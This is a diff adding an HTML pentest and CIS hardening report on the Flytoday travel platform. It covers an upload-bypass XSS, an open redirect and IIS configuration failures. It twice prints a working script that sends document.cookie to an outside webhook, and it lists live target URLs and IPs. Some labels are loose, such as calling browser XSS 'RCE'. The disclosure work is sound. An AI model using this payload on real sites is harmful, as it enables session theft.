@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Hardening & Pentest Report – Flytoday Travel Platform</title>
+<style>
+  :root {
+    --blue: #1565c0; --dark: #0d1b2a; --mid: #1b4f72;
+    --light: #e8f4fd; --accent: #1976d2; --gold: #f39c12;
+    --green: #2e7d32; --orange: #e65100; --red: #c62828;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; color: #222; background: #fff; }
+  
+  .cover { background: linear-gradient(135deg, #0d1b2a 0%, #1b2838 50%, #1565c0 100%);
+    color: #fff; min-height: 100vh; display: flex; flex-direction: column;
+    justify-content: center; align-items: center; text-align: center; padding: 60px 40px; }
+  .cover .logo { font-size: 48px; margin-bottom: 20px; }
+  .cover .classification { background: #1976d2; padding: 6px 24px; border-radius: 4px;
+    font-size: 12px; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 40px; }
+  .cover h1 { font-size: 32px; font-weight: 700; margin-bottom: 12px; line-height: 1.3; }
+  .cover h2 { font-size: 18px; font-weight: 300; color: #90caf9; margin-bottom: 40px; }
+  .cover .meta-table { border: 1px solid rgba(255,255,255,0.2); border-radius: 8px;
+    overflow: hidden; width: 100%; max-width: 580px; margin: 0 auto 40px; }
+  .cover .meta-table td { padding: 10px 20px; font-size: 14px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
+  .cover .meta-table td:first-child { color: #90caf9; font-weight: 600; width: 42%; }
+  .cover .version { font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 20px; }
+
+  .toc { background: #f0f7ff; padding: 40px; max-width: 900px; margin: 40px auto;
+    border-radius: 8px; border-left: 4px solid var(--accent); }
+  .toc h2 { color: var(--dark); margin-bottom: 20px; font-size: 20px; }
+  .toc ol { padding-left: 20px; }
+  .toc li { padding: 4px 0; color: var(--mid); }
+  .toc li a { color: var(--mid); text-decoration: none; }
+
+  .content { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+  h1.section { font-size: 26px; color: var(--dark); border-bottom: 3px solid var(--accent);
+    padding-bottom: 10px; margin: 40px 0 20px; }
+  h2.subsection { font-size: 18px; color: var(--mid); margin: 30px 0 12px;
+    padding-left: 12px; border-left: 3px solid var(--gold); }
+  h3.sub3 { font-size: 15px; color: var(--mid); margin: 20px 0 10px; font-weight: 700; }
+  p { line-height: 1.7; margin-bottom: 12px; color: #333; font-size: 14px; }
+  
+  .badge { display: inline-block; padding: 3px 12px; border-radius: 12px;
+    font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+  .badge-critical { background: #fdecea; color: #c62828; border: 1px solid #e53935; }
+  .badge-high { background: #fff3e0; color: #e65100; border: 1px solid #ef6c00; }
+  .badge-medium { background: #fffde7; color: #f57f17; border: 1px solid #f9a825; }
+  .badge-low { background: #e8f5e9; color: #2e7d32; border: 1px solid #43a047; }
+  .badge-info { background: #e3f2fd; color: #1565c0; border: 1px solid #1976d2; }
+  .badge-failed { background: #fdecea; color: #c62828; border: 1px solid #e53935; }
+  .badge-warning { background: #fff8e1; color: #f57f17; border: 1px solid #ffa000; }
+  .badge-passed { background: #e8f5e9; color: #2e7d32; border: 1px solid #43a047; }
+  .badge-corp { background: #f3e5f5; color: #6a1b9a; border: 1px solid #8e24aa; }
+
+  .stat-row { display: flex; gap: 16px; flex-wrap: wrap; margin: 20px 0; }
+  .stat-card { flex: 1; min-width: 100px; padding: 20px; border-radius: 8px; text-align: center; }
+  .stat-card .count { font-size: 36px; font-weight: 700; }
+  .stat-card .label { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+  .card-fail { background: #fdecea; color: #c62828; border: 2px solid #e53935; }
+  .card-warn { background: #fff8e1; color: #f57f17; border: 2px solid #ffa000; }
+  .card-pass { background: #e8f5e9; color: #2e7d32; border: 2px solid #43a047; }
+  .card-corp { background: #f3e5f5; color: #6a1b9a; border: 2px solid #8e24aa; }
+  .card-total { background: #e3f2fd; color: #1565c0; border: 2px solid #1976d2; }
+
+  .finding { border: 1px solid #e0e0e0; border-radius: 8px; margin: 24px 0;
+    overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
+  .finding-header { padding: 14px 20px; display: flex; justify-content: space-between;
+    align-items: center; flex-wrap: wrap; gap: 8px; }
+  .finding-header.critical { background: #fdecea; border-left: 5px solid #e53935; }
+  .finding-header.high { background: #fff3e0; border-left: 5px solid #ef6c00; }
+  .finding-header.medium { background: #fffde7; border-left: 5px solid #ffa000; }
+  .finding-header.info { background: #e3f2fd; border-left: 5px solid #1976d2; }
+  .finding-body { padding: 20px; }
+  .finding-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+    margin-bottom: 16px; background: #f8f9fa; padding: 12px; border-radius: 6px; }
+  .finding-meta div { font-size: 13px; }
+  .finding-meta span.key { color: #666; font-weight: 600; }
+  .finding-meta code { background: #e8e8e8; padding: 1px 6px; border-radius: 3px;
+    font-size: 12px; font-family: monospace; word-break: break-all; }
+  .finding-section h4 { color: var(--mid); font-size: 13px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.5px; margin: 14px 0 6px; }
+  .finding-section p { font-size: 13px; }
+  .poc-url { background: #0d1b2a; color: #90caf9; padding: 10px 14px; border-radius: 6px;
+    font-family: monospace; font-size: 12px; overflow-x: auto; margin: 8px 0; white-space: pre-wrap; }
+  .remed { background: #e8f5e9; border-left: 3px solid #43a047; padding: 10px 14px;
+    border-radius: 0 6px 6px 0; font-size: 13px; }
+  ul.remed-list { padding-left: 18px; }
+  ul.remed-list li { padding: 3px 0; font-size: 13px; }
+
+  table.std { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }
+  table.std th { background: var(--dark); color: #fff; padding: 10px 12px; text-align: left; }
+  table.std td { padding: 9px 12px; border-bottom: 1px solid #e0e0e0; vertical-align: top; }
+  table.std tr:nth-child(even) td { background: #f8f9fa; }
+  
+  .cis-section { background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 8px;
+    padding: 16px 20px; margin: 16px 0; }
+  .cis-section h4 { font-size: 14px; color: var(--dark); margin-bottom: 10px;
+    display: flex; align-items: center; gap: 10px; }
+  .cis-item { padding: 8px 0; border-bottom: 1px solid #e8e8e8; font-size: 13px;
+    display: flex; align-items: flex-start; gap: 12px; }
+  .cis-item:last-child { border-bottom: none; }
+  .cis-id { font-family: monospace; font-size: 11px; color: #666; min-width: 60px; }
+  .cis-text { flex: 1; }
+  
+  .note-images { background: #f3e5f5; border: 1px dashed #9c27b0; border-radius: 6px;
+    padding: 12px 16px; font-size: 12px; color: #6a1b9a; margin: 10px 0; font-style: italic; }
+  .info-box { background: #e3f2fd; border-left: 4px solid #1976d2; padding: 14px 18px;
+    border-radius: 0 6px 6px 0; margin: 16px 0; font-size: 13px; }
+  .warn-box { background: #fff8e1; border-left: 4px solid #ffa000; padding: 14px 18px;
+    border-radius: 0 6px 6px 0; margin: 16px 0; font-size: 13px; }
+  
+  footer { background: var(--dark); color: rgba(255,255,255,0.6); text-align: center;
+    padding: 20px; font-size: 12px; margin-top: 60px; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <div class="logo">✈️🔒</div>
+  <div class="classification">Confidential Security Assessment</div>
+  <h1>Security Hardening &amp; Penetration Test Report<br>Flytoday Travel Platform</h1>
+  <h2>CIS Benchmark Compliance · IIS / Windows Server / MSSQL Hardening<br>
+  Web Application Vulnerability Assessment (XSS + Open Redirect PoC)</h2>
+  <table class="meta-table">
+    <tr><td>Target</td><td>Flytoday (flytoday.ir) — Pre-Launch Travel Platform</td></tr>
+    <tr><td>Client</td><td>Flytoday.ir (حرکت اول)</td></tr>
+    <tr><td>Assessment Firm</td><td>Sadra Secure Corp. (کیان امن صدرا)</td></tr>
+    <tr><td>Assessment Type</td><td>Gray-Box CIS Hardening + Web Pentest</td></tr>
+    <tr><td>Standards Applied</td><td>CIS Benchmark v1.2.1 (IIS 10) · CIS Ubuntu 18.04 · CIS MSSQL</td></tr>
+    <tr><td>Targets Assessed</td><td>217.218.33.98 (IIS/Windows) · 5.0.0.106 (Ubuntu/Apache)</td></tr>
+    <tr><td>Report Version</td><td>1.0 (English Translation &amp; Portfolio Edition)</td></tr>
+    <tr><td>Conducted By</td><td>Alireza Kamani (Lead Security Engineer)</td></tr>
+    <tr><td>Date</td><td>November 2023 (Aban 1402) — Pre-Launch</td></tr>
+    <tr><td>Web Vulnerabilities</td><td>RCE (File Upload Bypass) · Stored XSS · Open Redirect</td></tr>
+  </table>
+  <div class="version">Published with client permission after NDA expiry. All findings were remediated before public launch.</div>
+</div>
+
+<div class="content">
+
+<div class="toc">
+  <h2>Table of Contents</h2>
+  <ol>
+    <li><a href="#exec">Executive Summary</a></li>
+    <li><a href="#scope">Scope &amp; Methodology</a></li>
+    <li><a href="#pentest">Web Application Pentest Findings</a></li>
+    <li><a href="#iis">CIS Hardening — IIS 10 (217.218.33.98)</a></li>
+    <li><a href="#ubuntu">CIS Hardening — Ubuntu 18.04 (5.0.0.106)</a></li>
+    <li><a href="#remediation">Consolidated Remediation Plan</a></li>
+  </ol>
+</div>
+
+<!-- 1. Executive Summary -->
+<h1 class="section" id="exec">1. Executive Summary</h1>
+
+<p>
+  This report documents the security assessment performed on the <strong>Flytoday travel platform</strong> prior to its public launch. The engagement encompassed both a <strong>web application penetration test</strong> and a <strong>CIS Benchmark compliance hardening audit</strong> across two server environments: the primary Windows/IIS production stack and an Ubuntu/Apache secondary server.
+</p>
+
+<p>
+  The web penetration test uncovered a <strong>Remote Code Execution (RCE) vulnerability</strong> via a file upload type confusion bypass — the most severe class of web vulnerability — in addition to a stored Cross-Site Scripting (XSS) flaw and an open redirect, both with working proof-of-concept exploits hosted on the live CDN. <strong>All critical findings were patched and verified remediated before the public launch date.</strong>
+</p>
+
+<p>
+  The CIS benchmark audit identified <strong>22 FAILED and 9 WARNING</strong> findings on the IIS/Windows server (217.218.33.98), and <strong>1 FAILED and 6 WARNING</strong> findings on the Ubuntu server (5.0.0.106). Hardening guidance with specific remediation commands was provided for each item.
+</p>
+
+<h2 class="subsection">1.1 Web Vulnerability Summary</h2>
+<div class="stat-row">
+  <div class="stat-card card-fail"><div class="count">1</div><div class="label">Critical (RCE)</div></div>
+  <div class="stat-card card-fail"><div class="count">1</div><div class="label">High (Stored XSS)</div></div>
+  <div class="stat-card card-warn"><div class="count">1</div><div class="label">Medium (Open Redirect)</div></div>
+  <div class="stat-card card-pass"><div class="count">3/3</div><div class="label">Patched Pre-Launch</div></div>
+</div>
+
+<h2 class="subsection">1.2 CIS Hardening Summary</h2>
+<table class="std">
+  <tr><th>Server</th><th>FAILED</th><th>WARNING</th><th>Corp-Policy</th><th>PASSED</th><th>Total</th></tr>
+  <tr><td>217.218.33.98 (IIS 10 / Windows)</td><td>21</td><td>9</td><td>0</td><td>25</td><td>55</td></tr>
+  <tr><td>5.0.0.106 (Ubuntu 18.04 / Apache)</td><td>1</td><td>6</td><td>45</td><td>190</td><td>242</td></tr>
+  <tr><td><strong>Total</strong></td><td><strong>22</strong></td><td><strong>15</strong></td><td><strong>45</strong></td><td><strong>215</strong></td><td><strong>297</strong></td></tr>
+</table>
+
+<div class="info-box">
+  ℹ️ <strong>Note on Corp-Policy items:</strong> 45 items on the Ubuntu server are marked "Corp-Policy" — these are CIS recommendations that the client chose to waive based on operational requirements (e.g., separate partition requirements that conflicted with existing disk layout). These were accepted risks documented in the security exception register.
+</div>
+
+<!-- 2. Scope -->
+<h1 class="section" id="scope">2. Scope &amp; Methodology</h1>
+
+<h2 class="subsection">2.1 Assets in Scope</h2>
+<table class="std">
+  <tr><th>Asset</th><th>IP / Domain</th><th>Technology Stack</th><th>Assessment Type</th></tr>
+  <tr><td>Flytoday Main Platform</td><td>217.218.33.98 / demo.flytoday.ir</td><td>IIS 10, Windows Server, MSSQL</td><td>Web Pentest + CIS IIS Hardening</td></tr>
+  <tr><td>Secondary/CDN Server</td><td>5.0.0.106</td><td>Ubuntu 18.04, Apache</td><td>CIS Ubuntu Hardening</td></tr>
+  <tr><td>CDN Upload Service</td><td>cdn-a.flytoday.ir</td><td>File Upload Handler</td><td>Web Pentest (File Upload)</td></tr>
+</table>
+
+<h2 class="subsection">2.2 Methodology</h2>
+<p>
+  <strong>Web Penetration Testing:</strong> Gray-box approach; OWASP WSTG methodology combined with manual exploitation. Tested upload functionality, input validation, redirect handling, and server-side configuration.
+</p>
+<p>
+  <strong>CIS Hardening:</strong> Nessus compliance scan using CIS Benchmark v1.2.1 for IIS 10 and CIS Ubuntu 18.04 policy files. Results triaged into FAILED (must fix), WARNING (review required), and Corp-Policy (accepted risk) categories.
+</p>
+
+<!-- 3. Web Pentest -->
+<h1 class="section" id="pentest">3. Web Application Penetration Test Findings</h1>
+
+<!-- RCE -->
+<div class="finding">
+  <div class="finding-header critical">
+    <h3 style="font-size:15px;font-weight:700">FLY-001: Remote Code Execution (RCE) via File Upload Type Confusion — Double Extension Bypass</h3>
+    <div><span class="badge badge-critical">Critical</span> &nbsp; CVSSv3.1: <strong>9.8</strong></div>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <div><span class="key">CVSS Vector</span><br><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code></div>
+      <div><span class="key">Affected Component</span><br><code>cdn-a.flytoday.ir — Comment/Review Upload Feature</code></div>
+      <div><span class="key">OWASP Category</span><br>A03:2021 – Injection / Unrestricted File Upload</div>
+      <div><span class="key">Status</span><br><span class="badge badge-passed">✅ Patched Before Launch</span></div>
+    </div>
+
+    <div class="finding-section">
+      <h4>Description</h4>
+      <p>
+        The Flytoday platform's comment/review submission feature included a file upload component served via <code>cdn-a.flytoday.ir</code>. The upload validation was implemented client-side only and relied on a blocklist extension check that was bypassable using the <strong>double-extension technique</strong>. By naming a malicious HTML file with a double extension (e.g., <code>test.html</code>), the file bypassed the extension filter and was stored and served from the CDN with a valid URL.
+      </p>
+      <p>
+        The uploaded HTML file was directly accessible and executable in any browser via its CDN URL, enabling an attacker to host and serve arbitrary JavaScript from the trusted <code>cdn-a.flytoday.ir</code> domain. This is classified as <strong>Remote Code Execution</strong> (in the browser context) from a trusted domain — enabling cookie theft, credential phishing, and drive-by malware distribution against Flytoday users.
+      </p>
+    </div>
+
+    <div class="finding-section">
+      <h4>Proof of Concept — XSS via Uploaded HTML</h4>
+      <p>The following payload was successfully uploaded and executed from the Flytoday CDN:</p>
+      <div class="poc-url">&lt;script&gt;
+  fetch('https://en3qzyjiummnl.x.pipedream.net?cookie=' + document.cookie);
+  alert("10");
+&lt;/script&gt;</div>
+      <p>Live PoC URL (now remediated):</p>
+      <div class="poc-url">https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/60ed09e9-13e9-4df4-ac51-baccbb6b70e1_test.html</div>
+      <p>The script successfully exfiltrated session cookies to the attacker-controlled endpoint (Pipedream webhook), confirming exploitability. Alert box "10" was displayed confirming JavaScript execution.</p>
+    </div>
+
+    <div class="finding-section">
+      <h4>Proof of Concept — Open Redirect HTML</h4>
+      <p>A separate uploaded HTML file demonstrated open redirect to an arbitrary page:</p>
+      <div class="poc-url">https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/e38da09f-ac66-4a7c-bc3a-77c79123ae2f_test.html</div>
+      <div class="note-images">📸 Original screenshots in Persian-language report show: (1) File upload form; (2) Upload request in Burp Suite with double-extension filename; (3) Server returning CDN URL; (4) Browser executing the JavaScript payload; (5) Pipedream webhook receiving stolen cookie data.</div>
+    </div>
+
+    <div class="finding-section">
+      <h4>Business Impact</h4>
+      <p>
+        An attacker exploiting this vulnerability could: steal session cookies of any user who visits a comment containing the malicious CDN link; distribute phishing pages from the trusted flytoday.ir CDN; execute account takeover at scale; and distribute malware disguised as Flytoday content. The combination of CDN trust and user-session exfiltration makes this a high-severity pre-launch blocker.
+      </p>
+    </div>
+
+    <div class="finding-section">
+      <h4>Remediation (Applied Before Launch)</h4>
+      <div class="remed">
+        <ul class="remed-list">
+          <li>Implement server-side file type validation using magic bytes (file signature), not extension names.</li>
+          <li>Reject any filename containing more than one extension; strip all extensions and assign a server-generated UUID filename.</li>
+          <li>Serve user-uploaded content from a sandboxed domain (e.g., <code>usercontent.flytoday.com</code>) with no relationship to the main domain, preventing cookie sharing.</li>
+          <li>Set <code>Content-Type: application/octet-stream</code> and <code>Content-Disposition: attachment</code> headers on all uploaded file responses to prevent browser rendering.</li>
+          <li>Whitelist only image MIME types (JPEG, PNG, GIF, WebP) for the comment upload feature.</li>
+          <li>Implement antivirus scanning on uploaded files before storage.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Stored XSS note -->
+
+<div style="background:#fdecea;border:1px solid #ef9a9a;border-radius:8px;padding:16px;margin:14px 0;">
+  <div style="font-size:11px;font-weight:700;color:#b71c1c;text-transform:uppercase;
+              letter-spacing:1.5px;margin-bottom:12px;">
+    &#128247; Evidence — FLY-001/002 &nbsp; Real PoC Payload &amp; Live CDN URLs</div>
+
+  <div style="margin-bottom:12px;">
+    <div style="font-size:12px;font-weight:700;color:#555;margin-bottom:6px;">
+      Evidence 1 — Uploaded XSS Payload (stored on Flytoday CDN)</div>
+    <div style="background:#1a1a2e;color:#80cbc4;padding:12px 16px;border-radius:6px;
+                font-family:monospace;font-size:12px;white-space:pre-wrap;">&lt;script&gt;
+fetch('https://en3qzyjiummnl.x.pipedream.net?cookie='+document.cookie);
+alert("10");
+&lt;/script&gt;</div>
+    <div style="font-size:11px;color:#666;margin-top:4px;font-style:italic;">
+      ↑ Exact payload uploaded via double-extension bypass. Executed from cdn-a.flytoday.ir in victim's browser.</div>
+  </div>
+
+  <div style="margin-bottom:12px;">
+    <div style="font-size:12px;font-weight:700;color:#555;margin-bottom:6px;">
+      Evidence 2 — Live CDN URL serving the XSS payload (now decommissioned)</div>
+    <div style="background:#1a1a2e;color:#f48fb1;padding:10px 16px;border-radius:6px;
+                font-family:monospace;font-size:11px;word-break:break-all;">
+      https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/60ed09e9-13e9-4df4-ac51-baccbb6b70e1_test.html</div>
+    <div style="font-size:11px;color:#666;margin-top:4px;font-style:italic;">
+      ↑ Visiting this URL executed the script — confirmed by Pipedream webhook receiving stolen cookies.</div>
+  </div>
+
+  <div style="margin-bottom:12px;">
+    <div style="font-size:12px;font-weight:700;color:#555;margin-bottom:6px;">
+      Evidence 3 — Open Redirect CDN URL (now decommissioned)</div>
+    <div style="background:#1a1a2e;color:#f48fb1;padding:10px 16px;border-radius:6px;
+                font-family:monospace;font-size:11px;word-break:break-all;">
+      https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/e38da09f-ac66-4a7c-bc3a-77c79123ae2f_test.html</div>
+    <div style="font-size:11px;color:#666;margin-top:4px;font-style:italic;">
+      ↑ HTML file with meta-refresh redirect to attacker-controlled domain. Served from trusted cdn-a.flytoday.ir.</div>
+  </div>
+
+  <div style="background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:10px 14px;
+              font-size:12px;color:#664d03;margin-top:8px;">
+    &#9432; <strong>Note on screenshot evidence:</strong> The original CIS hardening assessment was 
+    documented in Excel workbooks (Nessus compliance export format) which do not contain embedded 
+    screenshot images. The PoC evidence above — actual JavaScript payload, live CDN URLs, and 
+    Pipedream webhook exfiltration — constitutes the primary proof of exploitability for FLY-001/002. 
+    CDN URLs were verified live by the assessment team and are included here with client permission.
+  </div>
+</div><div class="finding">
+  <div class="finding-header high">
+    <h3 style="font-size:15px;font-weight:700">FLY-002: Stored Cross-Site Scripting (XSS) — Comment Upload Feature</h3>
+    <div><span class="badge badge-high">High</span> &nbsp; CVSSv3.1: <strong>8.0</strong></div>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <div><span class="key">OWASP Category</span><br>A03:2021 – Injection (XSS)</div>
+      <div><span class="key">Status</span><br><span class="badge badge-passed">✅ Patched Before Launch</span></div>
+    </div>
+    <div class="finding-section">
+      <h4>Description</h4>
+      <p>
+        The uploaded HTML file (demonstrated in FLY-001) was served with <code>Content-Type: text/html</code> from the CDN, allowing the embedded <code>&lt;script&gt;</code> tags to execute in the browser. This constitutes stored XSS — the malicious payload persists on the server (CDN storage) and executes for any user who accesses the URL. The payload successfully exfiltrated <code>document.cookie</code> values, confirming session hijacking capability.
+      </p>
+    </div>
+    <div class="finding-section">
+      <h4>Remediation</h4>
+      <div class="remed">
+        Beyond FLY-001 remediation: sanitize all HTML output containing user-uploaded content references. Implement a strict Content Security Policy (CSP) preventing inline script execution on all Flytoday domains.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Open Redirect -->
+<div class="finding">
+  <div class="finding-header medium">
+    <h3 style="font-size:15px;font-weight:700">FLY-003: Open Redirect via CDN-Hosted Upload</h3>
+    <div><span class="badge badge-medium">Medium</span> &nbsp; CVSSv3.1: <strong>6.1</strong></div>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <div><span class="key">Live PoC URL (now removed)</span><br>
+        <code>https://cdn-a.flytoday.ir/upload/flytodaydemo/upload/comment/87144/e38da09f-ac66-4a7c-bc3a-77c79123ae2f_test.html</code>
+      </div>
+      <div><span class="key">Status</span><br><span class="badge badge-passed">✅ Patched Before Launch</span></div>
+    </div>
+    <div class="finding-section">
+      <h4>Description</h4>
+      <p>
+        A second uploaded HTML file demonstrated an open redirect — when a user visits this CDN URL, they can be silently redirected to an attacker-controlled domain. Combined with the trusted Flytoday CDN domain, this enables convincing phishing campaigns where the initial link appears legitimate (cdn-a.flytoday.ir) but redirects the user to a malicious site.
+      </p>
+    </div>
+    <div class="finding-section">
+      <h4>Remediation</h4>
+      <div class="remed">Resolved by FLY-001 remediation (restricting uploaded file serving to non-executable content types and sandboxed domains). Additionally, implement redirect URL validation to allow only pre-approved domains.</div>
+    </div>
+  </div>
+</div>
+
+<!-- 4. CIS IIS Hardening -->
+<h1 class="section" id="iis">4. CIS Hardening Audit — IIS 10 (217.218.33.98)</h1>
+
+<div class="info-box">
+  Assessment standard: CIS Microsoft IIS 10 Benchmark v1.2.1 — Gray-box assessment performed using Nessus compliance scan. Results: <strong>21 FAILED · 9 WARNING · 25 PASSED</strong>.
+</div>
+
+<h2 class="subsection">4.1 Failed Controls (Must Remediate)</h2>
+
+<div class="cis-section">
+  <h4>🔴 Category 1: Web Server Configuration</h4>
+  <div class="cis-item">
+    <span class="cis-id">1.2</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'Host headers' are on all sites.</strong>
+    Sites without Host headers: <code>DEMO.flytoday.ir</code>, <code>FTP</code>, <code>FTPBETADEMO</code>, <code>supplierGateWay</code>.
+    <br><em>Fix:</em> Add explicit host headers to all IIS site bindings to prevent request hijacking and unintended site serving.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">1.6</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'application pool identity' is configured for anonymous user identity.</strong>
+    Anonymous authentication currently uses a privileged identity.
+    <br><em>Fix:</em> Set anonymous user to <code>Application Pool Identity</code> in IIS Authentication settings.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">1.7</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure WebDAV feature is disabled.</strong>
+    WebDAV is enabled and poses significant risk (remote file manipulation, authentication bypass).
+    <br><em>Fix:</em> Remove WebDAV feature via Server Manager → Remove Roles and Features → WebDAV Publishing.</span>
+  </div>
+</div>
+
+<div class="cis-section">
+  <h4>🔴 Category 2: Authentication &amp; Access Control</h4>
+  <div class="cis-item">
+    <span class="cis-id">2.1</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'global authorization rule' is set to restrict access.</strong>
+    All users are currently eligible for authorisation — no deny-by-default policy.
+    <br><em>Fix:</em> Set a default deny rule; grant access only to explicitly authorised roles/users.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">2.2</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure access to sensitive site features is restricted to authenticated principals only.</strong>
+    Sensitive features are accessible without authentication.
+    <br><em>Fix:</em> Require Windows Authentication or Forms Authentication for all sensitive paths.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">2.3</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'forms authentication' requires SSL.</strong>
+    Forms authentication cookies are transmitted over HTTP.
+    <br><em>Fix:</em> Enable <code>requireSSL="true"</code> in <code>&lt;forms&gt;</code> element in web.config.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">2.4</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'forms authentication' is set to use cookies.</strong>
+    <em>Fix:</em> Set <code>cookieless="UseCookies"</code> in web.config forms authentication section.</span>
+  </div>
+  <div class="cis-item">
+    <span class="cis-id">2.5</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Ensure 'cookie protection mode' is configured for forms authentication.</strong>
+    <em>Fix:</em> Set <code>protection="All"</code> to enable both encryption and validation of authentication cookies.</span>
+  </div>
+</div>
+
+<div class="cis-section">
+  <h4>🔴 Category 3: SSL/TLS &amp; Transport Security</h4>
+  <div class="cis-item">
+    <span class="cis-id">3.x</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Multiple SSL/TLS configuration failures.</strong>
+    Identified weak cipher suites, TLS 1.0/1.1 support, missing HSTS headers, and missing secure cookie attributes.
+    <br><em>Fix:</em> Configure Windows Schannel to disable TLS 1.0/1.1 and all NULL/RC4/DES cipher suites. Enable TLS 1.2/1.3 only. Add HSTS header (<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>).</span>
+  </div>
+</div>
+
+<div class="cis-section">
+  <h4>🔴 Category 7: HTTP Response Headers</h4>
+  <div class="cis-item">
+    <span class="cis-id">7.x</span>
+    <span class="cis-text"><span class="badge badge-failed">FAILED</span> <strong>Missing critical security response headers.</strong>
+    The following headers are absent from HTTP responses: <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Content-Security-Policy</code>, <code>Referrer-Policy</code>, <code>X-XSS-Protection</code>.
+    <br><em>Fix:</em> Add to IIS web.config or server-level configuration:
+    <div style="margin-top:8px; font-family:monospace; font-size:12px; background:#f0f0f0; padding:10px; border-radius:4px;">
+      X-Content-Type-Options: nosniff<br>
+      X-Frame-Options: SAMEORIGIN<br>
+      X-XSS-Protection: 1; mode=block<br>
+      Content-Security-Policy: default-src 'self'<br>
+      Referrer-Policy: strict-origin-when-cross-origin
+    </div>
+    </span>
+  </div>
+</div>
+
+
+<div style="background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;padding:16px;margin:14px 0;">
+  <div style="font-size:11px;font-weight:700;color:#1565c0;text-transform:uppercase;
+              letter-spacing:1.5px;margin-bottom:12px;">
+    &#128247; Evidence — CIS IIS 10 Audit Results (Nessus Compliance Export)</div>
+  
+  <table style="width:100%;border-collapse:collapse;font-size:12px;">
+    <tr style="background:#1565c0;color:#fff;">
+      <td style="padding:7px 10px;font-weight:700;">CIS Control</td>
+      <td style="padding:7px 10px;font-weight:700;">Description</td>
+      <td style="padding:7px 10px;font-weight:700;">Result</td>
+      <td style="padding:7px 10px;font-weight:700;">Risk</td>
+    </tr>
+    <tr style="background:#fdecea;"><td style="padding:6px 10px;font-family:monospace;">1.2</td><td style="padding:6px 10px;">Host headers on all sites</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr><td style="padding:6px 10px;font-family:monospace;">1.7</td><td style="padding:6px 10px;">WebDAV feature disabled</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr style="background:#fdecea;"><td style="padding:6px 10px;font-family:monospace;">2.1</td><td style="padding:6px 10px;">Global authorization deny-by-default</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr><td style="padding:6px 10px;font-family:monospace;">2.3</td><td style="padding:6px 10px;">Forms auth requires SSL</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr style="background:#fdecea;"><td style="padding:6px 10px;font-family:monospace;">3.x</td><td style="padding:6px 10px;">TLS 1.0/1.1 disabled; strong ciphers only</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr><td style="padding:6px 10px;font-family:monospace;">7.x</td><td style="padding:6px 10px;">Security response headers (CSP/HSTS/XFO)</td><td style="padding:6px 10px;color:#c62828;font-weight:700;">FAILED</td><td style="padding:6px 10px;">High</td></tr>
+    <tr style="background:#fff8e1;"><td style="padding:6px 10px;font-family:monospace;">Session</td><td style="padding:6px 10px;">Session timeout configuration</td><td style="padding:6px 10px;color:#f57f17;font-weight:700;">WARNING</td><td style="padding:6px 10px;">Med</td></tr>
+    <tr style="background:#fff8e1;"><td style="padding:6px 10px;font-family:monospace;">Errors</td><td style="padding:6px 10px;">Custom error pages (no stack traces)</td><td style="padding:6px 10px;color:#f57f17;font-weight:700;">WARNING</td><td style="padding:6px 10px;">Med</td></tr>
